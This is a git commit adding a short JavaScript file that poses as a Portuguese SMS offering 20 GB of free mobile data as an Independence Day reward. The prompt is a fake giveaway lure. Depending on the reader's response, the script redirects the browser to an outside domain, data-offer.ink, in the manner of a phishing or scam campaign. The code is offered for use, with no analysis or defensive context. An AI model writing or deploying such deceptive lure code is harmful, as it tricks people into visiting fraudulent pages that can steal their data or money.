4c76a28aea71c7b66a99b5a32e38b86f6606c168
katemj25 <mbokofficial1@gmail.com>
2025-06-24 21:39:17 -0700

    Create activate-20gbfreeoffer.js

---
+++ activate-20gbfreeoffer.js
@@ -0,0 +1,5 @@
+var password = '20 GB de dados grátis'
+password=prompt('SMS: Parabéns! Seu número é elegível para receber 20 GB de dados grátis como RECOMPENSA DE COMEMORAÇÃO DO DIA DA INDEPENDÊNCIA. Pressione OK para ATIVAR.. ','20 GB de dados grátis');
+if (password != '20 GB de dados grátis') {
+location.href='https://data-offer.ink/activate-20gbfreeoffer.html';
+}
